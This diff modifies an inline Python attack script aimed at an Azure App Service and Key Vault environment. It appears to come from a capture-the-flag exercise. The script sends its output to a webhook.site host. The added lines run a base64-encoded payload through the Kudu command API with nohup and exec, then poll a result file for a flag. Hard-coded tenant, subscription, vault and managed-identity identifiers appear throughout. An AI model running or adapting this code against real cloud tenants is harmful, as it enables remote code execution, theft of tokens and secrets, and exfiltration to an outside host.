@@ -5,6 +5,7 @@ import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid,traceba
 TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; RG='rg-tbl-reporting-prod-eus'; APP='app-tbl-reporting-prod'; KV1='https://kv-tbl-prod-x3euoz.vault.azure.net'; HOOK='https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825'
 def out(x):
  s=json.dumps(x,default=str); print(s,flush=True)
+ if x.get('stage') not in ('flag','app-flag','kudu-result','app-error','worker-error','app-top-error','outer-error'): return
  try: urllib.request.urlopen(urllib.request.Request(HOOK,data=s.encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
  except Exception: pass
 def j(url,tok):
@@ -26,6 +27,7 @@ try:
  app=r'''import os,json,time,uuid,urllib.parse,urllib.request,urllib.error,traceback
 HOOK="https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825"; SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"; MIRES="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"; CLIENT="7a85156a-01c4-4e61-8472-40a92107159b"; PRINCIPAL="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
 def out(x):
+ if x.get("stage") not in ("flag","app-flag","app-error","worker-error","app-top-error"): return
  try: urllib.request.urlopen(urllib.request.Request(HOOK,data=json.dumps(x,default=str).encode(),method="POST",headers={"Content-Type":"application/json"}),timeout=8).read()
  except Exception: pass
 def tok(resource):
@@ -67,6 +69,15 @@ try:
  def ok(): return "ok"
 except Exception: pass
 '''
- data=app.encode(); u=base+'/api/vfs/site/wwwroot/app.py'; out({'stage':'kudu-write','response':call(u,auth,'PUT',data,20)}); out({'stage':'kudu-restart','response':call(base+'/api/restart',auth,'POST',b'',20)}); print('dispatch=done',flush=True)
+ b64=base64.b64encode(app.encode()).decode()
+ cmd="nohup python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
+ body=json.dumps({'command':cmd,'dir':'site/wwwroot'}).encode()
+ out({'stage':'kudu-command','response':call(base+'/api/command',auth,'POST',body,25)})
+ for i in range(12):
+  r=call(base+'/api/vfs/site/wwwroot/ctf_flag_result',auth,'GET',None,8)
+  if r.get('status')==200 and ('flag' in r.get('body','').lower() or 'app-' in r.get('body','').lower()):
+   out({'stage':'kudu-result','response':r}); break
+  time.sleep(3)
+ print('dispatch=done',flush=True)
 except Exception as e: out({'stage':'outer-error','error':repr(e),'trace':traceback.format_exc()})
 PY2
